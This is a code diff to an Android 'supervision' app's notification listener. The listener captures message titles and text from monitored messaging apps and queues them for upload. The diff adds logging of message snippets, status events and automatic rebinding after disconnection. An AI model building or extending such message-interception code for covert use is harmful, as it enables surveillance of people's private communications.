@@ -1,7 +1,13 @@
 package com.surveillancepro.android.services
 
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.content.Context
+import android.os.Build
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
+import android.util.Log
 import com.surveillancepro.android.data.DeviceStorage
 import com.surveillancepro.android.data.EventQueue
 import java.text.SimpleDateFormat
@@ -9,6 +15,15 @@ import java.util.Date
 import java.util.Locale
 
 class SupervisionNotificationListener : NotificationListenerService() {
+
+    companion object {
+        private const val TAG = "NotifListener"
+        private const val CHANNEL_ID = "notif_listener_channel"
+        
+        // Variable statique pour vérifier si le service est actif
+        @Volatile
+        var isServiceRunning = false
+    }
 
     private var lastNotifKey = ""
     private var lastNotifTime = 0L
@@ -70,12 +85,49 @@ class SupervisionNotificationListener : NotificationListenerService() {
         "message audio", "nota de voz", "sprachnachricht",
     )
 
-    override fun onNotificationPosted(sbn: StatusBarNotification) {
+    override fun onListenerConnected() {
+        super.onListenerConnected()
+        isServiceRunning = true
+        Log.d(TAG, "✅ NotificationListener CONNECTÉ - Service actif")
+        
+        // Envoyer un événement pour confirmer que le service fonctionne
         val storage = DeviceStorage.getInstance(applicationContext)
-        if (!storage.hasAccepted || storage.deviceToken == null) return
+        if (storage.hasAccepted && storage.deviceToken != null) {
+            val queue = EventQueue.getInstance(applicationContext)
+            queue.enqueue("notification_listener_status", mapOf(
+                "status" to "connected",
+                "timestamp" to SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
+            ))
+        }
+    }
+    
+    override fun onListenerDisconnected() {
+        super.onListenerDisconnected()
+        isServiceRunning = false
+        Log.w(TAG, "⚠️ NotificationListener DÉCONNECTÉ")
+        
+        // Sur MIUI, essayer de se reconnecter
+        requestRebind(android.content.ComponentName(this, SupervisionNotificationListener::class.java))
+    }
+
+    override fun onNotificationPosted(sbn: StatusBarNotification) {
+        Log.d(TAG, "📩 Notification reçue de: ${sbn.packageName}")
+        
+        val storage = DeviceStorage.getInstance(applicationContext)
+        if (!storage.hasAccepted || storage.deviceToken == null) {
+            Log.w(TAG, "⚠️ Notification ignorée: hasAccepted=${storage.hasAccepted}, token=${storage.deviceToken != null}")
+            return
+        }
 
         val packageName = sbn.packageName
-        val appName = monitoredApps[packageName] ?: return
+        val appName = monitoredApps[packageName]
+        
+        if (appName == null) {
+            Log.d(TAG, "📦 App non surveillée: $packageName")
+            return
+        }
+        
+        Log.d(TAG, "✅ App surveillée détectée: $appName ($packageName)")
 
         val extras = sbn.notification.extras
         val title = extras.getCharSequence("android.title")?.toString() ?: ""
@@ -85,7 +137,12 @@ class SupervisionNotificationListener : NotificationListenerService() {
         val infoText = extras.getCharSequence("android.infoText")?.toString()
 
         val messageContent = bigText ?: text
-        if (messageContent.isBlank()) return
+        if (messageContent.isBlank()) {
+            Log.d(TAG, "⚠️ Message vide ignoré")
+            return
+        }
+        
+        Log.d(TAG, "📝 Message: $title -> ${messageContent.take(50)}...")
 
         // Déduplication améliorée par hash
         val notifKey = "$packageName|$title|${messageContent.take(100)}".hashCode().toString()
@@ -136,6 +193,7 @@ class SupervisionNotificationListener : NotificationListenerService() {
         }
         
         queue.enqueue(eventType, payload)
+        Log.d(TAG, "✅ Message envoyé à la queue: $eventType - $appName")
     }
 
     /**
